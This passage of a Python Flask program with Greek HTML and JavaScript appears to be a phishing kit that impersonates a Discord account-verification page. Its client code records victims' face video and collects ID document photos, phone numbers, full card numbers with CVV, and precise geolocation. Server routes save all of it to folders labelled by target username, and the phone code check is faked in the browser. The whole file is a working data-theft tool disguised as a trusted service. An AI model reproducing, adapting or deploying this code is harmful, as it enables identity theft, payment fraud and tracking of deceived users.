            indicators.forEach((indicator, index) => {{
                indicator.classList.remove('active', 'completed');
                if (index + 1 < currentStep) {{
                    indicator.classList.add('completed');
                }} else if (index + 1 === currentStep) {{
                    indicator.classList.add('active');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            // Απόκρυψη όλων των βημάτων
            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            
            // Εμφάνιση ζητούμενου βήματος
            const stepElement = document.getElementById('step' + stepNumber);
            if (stepElement) {{
                stepElement.classList.add('active');
                currentStep = stepNumber;
                updateProgress();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps + 1) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Επαλήθευση Προσώπου
        async function startFaceVerification() {{
            try {{
                const button = document.getElementById('startFaceBtn');
                button.disabled = true;
                button.innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Κάμερα...';
                
                // Αίτημα πρόσβασης κάμερας
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 640 }}
                    }},
                    audio: false
                }});
                
                // Εμφάνιση βίντεο
                document.getElementById('faceVideo').srcObject = faceStream;
                
                // Έναρξη διαδικασίας επαλήθευσης
                startFaceInstructions();
                
            }} catch (error) {{
                console.error('Σφάλμα πρόσβασης κάμερας:', error);
                alert('Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχετε παραχωρήσει δικαιώματα κάμερας.');
                const button = document.getElementById('startFaceBtn');
                button.disabled = false;
                button.textContent = 'Έναρξη Σάρωσης Προσώπου';
            }}
        }}
        
        function startFaceInstructions() {{
            currentInstructionIndex = 0;
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            showFaceInstruction(0);
            
            // Έναρξη εγγραφής προσώπου
            startFaceRecording();
            
            // Έναρξη χρονόμετρου
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            
            // Κύκλος οδηγιών
            instructionTimer = setInterval(() => {{
                currentInstructionIndex++;
                if (currentInstructionIndex < faceInstructions.length) {{
                    showFaceInstruction(currentInstructionIndex);
                }}
            }}, 3000);
        }}
        
        function showFaceInstruction(index) {{
            const instruction = faceInstructions[index];
            if (instruction) {{
                const instructionDiv = document.getElementById('faceInstruction');
                instructionDiv.querySelector('.instruction-icon').textContent = instruction.icon;
                document.getElementById('instructionText').textContent = instruction.text;
                document.getElementById('instructionDetail').textContent = instruction.detail;
            }}
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById('faceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            const options = {{ mimeType: 'video/webm;codecs=vp9' }};
            
            try {{
                faceRecorder = new MediaRecorder(faceStream, options);
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    faceChunks.push(event.data);
                }}
            }};
            
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            clearInterval(instructionTimer);
            
            // Διακοπή εγγραφής
            if (faceRecorder && faceRecorder.state === 'recording') {{
                faceRecorder.stop();
            }}
            
            // Διακοπή κάμερας
            if (faceStream) {{
                faceStream.getTracks().forEach(track => track.stop());
            }}
            
            // Εμφάνιση ολοκλήρωσης
            showFaceInstruction(faceInstructions.length - 1);
            document.getElementById('faceTimer').textContent = "✅ Ολοκληρώθηκε";
            
            // Αυτόματη συνέχεια μετά από καθυστέρηση
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            
            const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_face_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername,
                        discriminator: discriminator,
                        account_type: accountType
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Η επαλήθευση προσώπου μεταφορτώθηκε');
                    }},
                    error: function(xhr, status, error) {{
                        console.error('Σφάλμα μεταφόρτωσης προσώπου:', error);
                    }}
                }});
            }};
            
            reader.readAsDataURL(videoBlob);
        }}
        
        // Επαλήθευση Ταυτότητας
        function handleIDFileSelect(input, type) {{
            const file = input.files[0];
            if (file) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFileDrop(event, type) {{
            event.preventDefault();
            event.currentTarget.classList.remove('dragover');
            const file = event.dataTransfer.files[0];
            if (file && file.type.startsWith('image/')) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFile(file, type) {{
            // Εμφάνιση προεπισκόπησης
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById(type + 'Preview');
                const previewImage = document.getElementById(type + 'PreviewImage');
                previewImage.src = e.target.result;
                preview.style.display = 'block';
            }};
            reader.readAsDataURL(file);
            
            // Αποθήκευση αρχείου
            idFiles[type] = file;
            checkIDSubmitReady();
        }}
        
        function checkIDSubmitReady() {{
            const hasFront = idFiles.front !== null;
            document.getElementById('submitIdBtn').disabled = !hasFront;
        }}
        
        function submitIDVerification() {{
            const statusDiv = document.getElementById('idStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Μεταφόρτωση εγγράφων ταυτότητας...';
            statusDiv.style.display = 'block';
            
            const button = document.getElementById('submitIdBtn');
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
            
            // Προετοιμασία δεδομένων φόρμας
            const formData = new FormData();
            if (idFiles.front) formData.append('front_id', idFiles.front);
            if (idFiles.back) formData.append('back_id', idFiles.back);
            formData.append('timestamp', new Date().toISOString());
            formData.append('session_id', sessionId);
            formData.append('target_username', targetUsername);
            formData.append('discriminator', discriminator);
            formData.append('id_type', '{id_type}');
            formData.append('account_type', accountType);
            
            // Υποβολή
            $.ajax({{
                url: '/submit_id_verification',
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ Τα έγγραφα ταυτότητας μεταφορτώθηκαν επιτυχώς!';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }},
                error: function(xhr, status, error) {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Η μεταφόρτωση απέτυχε. Παρακαλώ δοκιμάστε ξανά.';
                    button.disabled = false;
                    button.textContent = 'Μεταφόρτωση Εγγράφων Ταυτότητας';
                }}
            }});
        }}
        
        // Επαλήθευση Τηλεφώνου
        function sendVerificationCode() {{
            const phone = document.getElementById('phoneNumber').value;
            if (!phone) {{
                alert('Παρακαλώ εισάγετε τον αριθμό τηλεφώνου σας.');
                return;
            }}
            
            phoneNumber = phone;
            const button = document.getElementById('sendCodeBtn');
            const statusDiv = document.getElementById('phoneStatus');
            
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Αποστολή Κωδικού...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Αποστολή κωδικού επαλήθευσης...';
            statusDiv.style.display = 'block';
            
            // Ενεργοποίηση εισαγωγής κωδικού
            document.getElementById('verificationCode').disabled = false;
            document.getElementById('verificationCode').focus();
            
            // Προσομοίωση αποστολής κωδικού
            setTimeout(() => {{
                statusDiv.className = 'status-message status-success';
                statusDiv.textContent = '✓ Ο κωδικός επαλήθευσης στάλθηκε! Ελέγξτε το τηλέφωνό σας.';
                button.disabled = false;
                button.textContent = 'Επανάληψη Αποστολής Κωδικού';
                button.onclick = resendVerificationCode;
                
                // Δημιουργία τυχαίου κωδικού (σε πραγματική εφαρμογή, θα έρχονταν από τον διακομιστή)
                const generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
                verificationCode = generatedCode;
                
                // Ενεργοποίηση κουμπιού υποβολής
                const verifyBtn = document.createElement('button');
                verifyBtn.className = 'button success-btn';
                verifyBtn.textContent = 'Επαλήθευση Κωδικού';
                verifyBtn.onclick = verifyPhoneCode;
                
                button.parentNode.insertBefore(verifyBtn, button.nextSibling);
                
                // Αποθήκευση δεδομένων επαλήθευσης τηλεφώνου
                $.ajax({{
                    url: '/submit_phone_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        phone_number: phone,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername,
                        discriminator: discriminator
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Τα δεδομένα επαλήθευσης τηλεφώνου αποθηκεύτηκαν');
                    }}
                }});
            }}, 2000);
        }}
        
        function resendVerificationCode() {{
            const statusDiv = document.getElementById('phoneStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Επανάληψη αποστολής κωδικού επαλήθευσης...';
            
            setTimeout(() => {{
                statusDiv.className = 'status-message status-success';
                statusDiv.textContent = '✓ Νέος κωδικός επαλήθευσης στάλθηκε!';
            }}, 1500);
        }}
        
        function verifyPhoneCode() {{
            const enteredCode = document.getElementById('verificationCode').value;
            if (!enteredCode || enteredCode.length !== 6) {{
                alert('Παρακαλώ εισάγετε τον 6ψήφιο κωδικό επαλήθευσης.');
                return;
            }}
            
            const statusDiv = document.getElementById('phoneStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Επαλήθευση κωδικού...';
            
            // Προσομοίωση επαλήθευσης
            setTimeout(() => {{
                if (enteredCode === verificationCode) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ Ο αριθμός τηλεφώνου επαληθεύτηκε επιτυχώς!';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }} else {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Μη έγκυρος κωδικός επαλήθευσης. Παρακαλώ δοκιμάστε ξανά.';
                }}
            }}, 1500);
        }}
        
        // Επαλήθευση Πληρωμής
        function selectPaymentMethod(method) {{
            selectedPaymentMethod = method;
            
            // Ενημέρωση UI
            document.querySelectorAll('.payment-option').forEach(option => {{
                option.classList.remove('selected');
            }});
            event.currentTarget.classList.add('selected');
            
            // Εμφάνιση φόρμας πληρωμής
            document.getElementById('paymentForm').style.display = 'block';
            
            // Ενεργοποίηση κουμπιού υποβολής
            document.getElementById('submitPaymentBtn').disabled = false;
        }}
        
        function submitPaymentVerification() {{
            const cardNumber = document.getElementById('cardNumber').value;
            const cardExpiry = document.getElementById('cardExpiry').value;
            const cardCvv = document.getElementById('cardCvv').value;
            const cardName = document.getElementById('cardName').value;
            
            if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {{
                alert('Παρακαλώ συμπληρώστε όλες τις λεπτομέρειες πληρωμής.');
                return;
            }}
            
            const statusDiv = document.getElementById('paymentStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Επαλήθευση μεθόδου πληρωμής...';
            statusDiv.style.display = 'block';
            
            const button = document.getElementById('submitPaymentBtn');
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
            
            // Συλλογή δεδομένων πληρωμής
            paymentData = {{
                method: selectedPaymentMethod,
                card_number: cardNumber,
                expiry_date: cardExpiry,
                cvv: cardCvv,
                card_name: cardName,
                timestamp: new Date().toISOString(),
                session_id: sessionId,
                target_username: targetUsername,
                discriminator: discriminator
            }};
            
            // Προσομοίωση κλήσης API
            setTimeout(() => {{
                statusDiv.className = 'status-message status-success';
                statusDiv.textContent = '✓ Η μέθοδος πληρωμής επαληθεύτηκε επιτυχώς!';
                
                // Υποβολή στον διακομιστή
                $.ajax({{
                    url: '/submit_payment_verification',
                    type: 'POST',
                    data: JSON.stringify(paymentData),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Η επαλήθευση πληρωμής μεταφορτώθηκε');
                    }}
                }});
                
                setTimeout(() => {{
                    nextStep();
                }}, 1500);
            }}, 2000);
        }}
        
        // Επαλήθευση Τοποθεσίας
        function requestLocation() {{
            const button = document.getElementById('locationBtn');
            const statusDiv = document.getElementById('locationStatus');
            const detailsDiv = document.getElementById('locationDetails');
            
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Λήψη Τοποθεσίας...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Πρόσβαση στην τοποθεσία σας...';
            statusDiv.style.display = 'block';
            
            if (!navigator.geolocation) {{
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Η γεωεντοπισμός δεν υποστηρίζεται από τον περιηγητή σας.';
                button.disabled = false;
                button.textContent = 'Δοκιμάστε Ξανά';
                return;
            }}
            
            // Λήψη τοποθεσίας
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    updateLocationUI(position);
                    sendLocationToServer(position);
                    completeLocationVerification();
                }},
                (error) => {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = `Σφάλμα: ${{error.message}}. Παρακαλώ ενεργοποιήστε τις υπηρεσίες τοποθεσίας.`;
                    button.disabled = false;
                    button.textContent = 'Δοκιμάστε Ξανά';
                }},
                {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
            );
        }}
        
        function updateLocationUI(position) {{
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Ενημέρωση εμφάνισης
            document.getElementById('latValue').textContent = lat.toFixed(6);
            document.getElementById('lonValue').textContent = lon.toFixed(6);
            document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} μέτρα`;
            document.getElementById('addressValue').textContent = 'Επεξεργασία διεύθυνσης...';
            
            // Υπολογισμός ποσοστού ακρίβειας
            let accuracyPercentage = 100;
            if (accuracy < 10) accuracyPercentage = 95;
            else if (accuracy < 50) accuracyPercentage = 85;
            else if (accuracy < 100) accuracyPercentage = 70;
            else if (accuracy < 500) accuracyPercentage = 50;
            else accuracyPercentage = 30;
            
            document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
            
            // Εμφάνιση λεπτομερειών
            document.getElementById('locationDetails').style.display = 'block';
            
            // Ενημέρωση κατάστασης
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = `✓ Η τοποθεσία λήφθηκε με ${{Math.round(accuracy)}}m ακρίβεια`;
            
            // Αποθήκευση δεδομένων
            locationData = {{
                latitude: lat,
                longitude: lon,
                accuracy: accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                heading: position.coords.heading,
                user_agent: navigator.userAgent
            }};
        }}
        
        function sendLocationToServer(position) {{
            $.ajax({{
                url: '/submit_location_verification',
                type: 'POST',
                data: JSON.stringify({{
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_username: targetUsername,
                    discriminator: discriminator,
                    account_type: accountType
                }}),
                contentType: 'application/json',
                success: function(response) {{
                    console.log('Τα δεδομένα τοποθεσίας μεταφορτώθηκαν');
                }}
            }});
        }}
        
        function completeLocationVerification() {{
            const button = document.getElementById('locationBtn');
            button.disabled = true;
            button.textContent = '✓ Η Τοποθεσία Επαληθεύτηκε';
            
            setTimeout(() => {{
                startFinalVerification();
            }}, 2000);
        }}
        
        // Τελική Επεξεργασία
        function startFinalVerification() {{
            showStep('stepFinal');
            const statusDiv = document.getElementById('finalStatus');
            let progress = 25;
            
            const progressInterval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                let message = '';
                if (progress < 30) {{
                    message = `Επαλήθευση σάρωσης προσώπου... ${{Math.round(progress)}}%`;
                }} else if (progress < 50) {{
                    message = `Έλεγχος εγγράφων ταυτότητας... ${{Math.round(progress)}}%`;
                }} else if (progress < 70) {{
                    message = `Επαλήθευση αριθμού τηλεφώνου... ${{Math.round(progress)}}%`;
                }} else if (progress < 85) {{
                    message = `Επεξεργασία πληρωμής... ${{Math.round(progress)}}%`;
                }} else if (progress < 95) {{
                    message = `Ανάλυση δεδομένων τοποθεσίας... ${{Math.round(progress)}}%`;
                }} else {{
                    message = `Ολοκλήρωση επαλήθευσης... ${{Math.round(progress)}}%`;
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(progressInterval);
                    setTimeout(() => {{
                        statusDiv.className = 'status-message status-success';
                        statusDiv.textContent = `✓ Η επαλήθευση ολοκληρώθηκε για ${{targetUsername}}${{discriminator}}!`;
                        
                        // Υποβολή πλήρους επαλήθευσης
                        submitCompleteVerification();
                        
                        setTimeout(() => {{
                            showCompletionPage();
                        }}, 1500);
                    }}, 1000);
                }}
            }}, 800);
        }}
        
        function showCompletionPage() {{
            showStep('stepComplete');
            
            // Έναρξη χρονόμετρου
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = countdown;
            
            countdownTimer = setInterval(() => {{
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(countdownTimer);
                    showReviewPage();
                }}
            }}, 1000);
        }}
        
        function showReviewPage() {{
            clearInterval(countdownTimer);
            showStep('stepReview');
        }}
        
        function returnToDiscord() {{
            window.location.href = 'https://discord.com';
        }}
        
        function checkVerificationStatus() {{
            alert('Η κατάσταση επαλήθευσης θα σταλεί στο email σας εντός 48 ωρών. Παρακαλώ ελέγξτε το email που είναι συνδεδεμένο με τον λογαριασμό σας στο Discord.');
        }}
        
        function submitCompleteVerification() {{
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_username: targetUsername,
                    discriminator: discriminator,
                    account_type: accountType,
                    completed_steps: currentStep,
                    verification_timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    screen_resolution: `${{screen.width}}x${{screen.height}}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }}),
                contentType: 'application/json'
            }});
        }}
        
        // Αρχικοποίηση
        updateProgress();
        
        // Αυτόματη έναρξη πρώτου βήματος
        setTimeout(() => {{
            showStep(1);
        }}, 500);
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_greek_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            discriminator = data.get('discriminator', 'άγνωστο')
            account_type = data.get('account_type', 'άγνωστο')
            
            # Δημιουργία ονόματος αρχείου
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"discord_face_{target_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
            
            # Αποθήκευση βίντεο
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            # Αποθήκευση μεταδεδομένων
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'discord_face_verification',
                'target_username': target_username,
                'discriminator': discriminator,
                'account_type': account_type,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'saved_at': datetime.now().isoformat()
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση προσώπου Discord για {target_username}{discriminator}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση προσώπου υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα βίντεο προσώπου"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης προσώπου: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'άγνωστο')
        target_username = request.form.get('target_username', 'άγνωστο')
        discriminator = request.form.get('discriminator', 'άγνωστο')
        account_type = request.form.get('account_type', 'άγνωστο')
        id_type = request.form.get('id_type', 'government')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        # Επεξεργασία μπροστινής ταυτότητας
        front_filename = None
        if 'front_id' in request.files:
            front_file = request.files['front_id']
            if front_file.filename:
                file_ext = front_file.filename.split('.')[-1] if '.' in front_file.filename else 'jpg'
                front_filename = f"discord_id_front_{target_username}_{session_id}_{timestamp}.{file_ext}"
                front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                front_file.save(front_path)
        
        # Επεξεργασία πίσω ταυτότητας
        back_filename = None
        if 'back_id' in request.files:
            back_file = request.files['back_id']
            if back_file.filename:
                file_ext = back_file.filename.split('.')[-1] if '.' in back_file.filename else 'jpg'
                back_filename = f"discord_id_back_{target_username}_{session_id}_{timestamp}.{file_ext}"
                back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                back_file.save(back_path)
        
        # Αποθήκευση μεταδεδομένων
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
        metadata = {
            'front_id': front_filename,
            'back_id': back_filename,
            'type': 'discord_id_verification',
            'id_type': id_type,
            'target_username': target_username,
            'discriminator': discriminator,
            'account_type': account_type,
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'saved_at': datetime.now().isoformat()
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Αποθηκεύτηκαν έγγραφα ταυτότητας Discord για {target_username}{discriminator}: {front_filename}, {back_filename}")
        return jsonify({"status": "success", "message": "Η επαλήθευση ταυτότητας υποβλήθηκε"}), 200
        
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης ταυτότητας: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_phone_verification', methods=['POST'])
def submit_phone_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            discriminator = data.get('discriminator', 'άγνωστο')
            phone_number = data.get('phone_number', 'άγνωστο')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"discord_phone_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'phone_verification', filename)
            
            # Καθαρισμός αριθμού τηλεφώνου για αποθήκευση
            safe_data = data.copy()
            if 'phone_number' in safe_data:
                # Απόκρυψη αριθμού τηλεφώνου για ιδιωτικότητα
                phone = safe_data['phone_number']
                if len(phone) > 4:
                    safe_data['phone_number'] = phone[:3] + '****' + phone[-2:]
            
            safe_data['received_at'] = datetime.now().isoformat()
            safe_data['server_timestamp'] = timestamp
            
            with open(file_path, 'w') as f:
                json.dump(safe_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση τηλεφώνου Discord για {target_username}{discriminator}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση τηλεφώνου υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα τηλεφώνου"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τηλεφώνου: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_payment_verification', methods=['POST'])
def submit_payment_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            discriminator = data.get('discriminator', 'άγνωστο')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"discord_payment_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'payment_proofs', filename)
            
            # Αφαίρεση ευαίσθητων δεδομένων (σε πραγματικό σενάριο, αυτά θα ήταν κρυπτογραφημένα)
            safe_data = data.copy()
            if 'card_number' in safe_data:
                safe_data['card_number'] = '****' + safe_data['card_number'][-4:] if safe_data['card_number'] else '****'
            if 'cvv' in safe_data:
                safe_data['cvv'] = '***'
            
            safe_data['received_at'] = datetime.now().isoformat()
            safe_data['server_timestamp'] = timestamp
            
            with open(file_path, 'w') as f:
                json.dump(safe_data, f, indent=2)
            
            print(f"Αποθηκεύτηκε επαλήθευση πληρωμής Discord για {target_username}{discriminator}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση πληρωμής υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα πληρωμής"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης πληρωμής: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            discriminator = data.get('discriminator', 'άγνωστο')
            
            # Προσθήκη ονόματος χρήστη στόχου στα δεδομένα
            data['target_username'] = target_username
            data['discriminator'] = discriminator
            
            # Επεξεργασία τοποθεσίας σε παρασκηνιακό thread
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Λήφθηκαν δεδομένα τοποθεσίας Discord για {target_username}{discriminator}: {session_id}")
            return jsonify({"status": "success", "message": "Η επαλήθευση τοποθεσίας υποβλήθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα τοποθεσίας"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης επαλήθευσης τοποθεσίας: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'άγνωστο')
            target_username = data.get('target_username', 'άγνωστο')
            discriminator = data.get('discriminator', 'άγνωστο')
            account_type = data.get('account_type', 'άγνωστο')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"discord_complete_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            # Προσθήκη πληροφοριών συστήματος
            data['received_at'] = datetime.now().isoformat()
            data['server_timestamp'] = timestamp
            data['verification_type'] = 'discord_complete'
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Αποθηκεύτηκε πλήρης επαλήθευση Discord για {target_username}{discriminator}: {filename}")
            return jsonify({"status": "success", "message": "Η επαλήθευση ολοκληρώθηκε"}), 200
        else:
            return jsonify({"status": "error", "message": "Δεν ελήφθησαν δεδομένα"}), 400
    except Exception as e:
        print(f"Σφάλμα αποθήκευσης σύνοψης επαλήθευσης: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/privacy_policy')
def privacy_policy():
    return '''<!DOCTYPE html>
    <html>
    <head>
        <title>Πολιτική Απορρήτου Discord</title>
        <style>
            :root {
                --discord-blurple: #5865F2;
                --discord-dark: #2F3136;
                --discord-darker: #202225;
                --discord-light: #FFFFFF;
                --discord-gray: #96989D;
            }
            
            body { 
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                padding: 20px; 
                max-width: 800px; 
                margin: 0 auto; 
                background-color: var(--discord-darker);
                color: var(--discord-light);
            }
            h1 { 
                color: var(--discord-blurple); 
                margin-bottom: 30px;
                font-size: 2.5rem;
            }
            h2 {
                color: var(--discord-blurple);
                margin-top: 30px;
                margin-bottom: 15px;
                font-size: 1.5rem;
            }
            .container {
                background: linear-gradient(145deg, var(--discord-dark), var(--discord-darker));
                padding: 40px;
                border-radius: 16px;
                border: 1px solid #4F545C;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            }
            ul {
                padding-left: 20px;
                margin: 15px 0;
            }
            li {
                margin-bottom: 12px;
                line-height: 1.6;
                color: var(--discord-gray);
            }
            strong {
                color: var(--discord-light);
            }
            p {
                color: var(--discord-gray);
                line-height: 1.6;
                margin-bottom: 20px;
            }
            .highlight {
                background: rgba(88, 101, 242, 0.1);
                border-left: 4px solid var(--discord-blurple);
                padding: 15px 20px;
                margin: 20px 0;
                border-radius: 0 8px 8px 0;
            }
            .section {
                margin-bottom: 30px;
                padding-bottom: 30px;
                border-bottom: 1px solid #4F545C;
            }
            .section:last-child {
                border-bottom: none;
                margin-bottom: 0;
                padding-bottom: 0;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Ειδοποίηση Απορρήτου Επαλήθευσης Λογαριασμού Discord</h1>
            
            <div class="section">
                <div class="highlight">
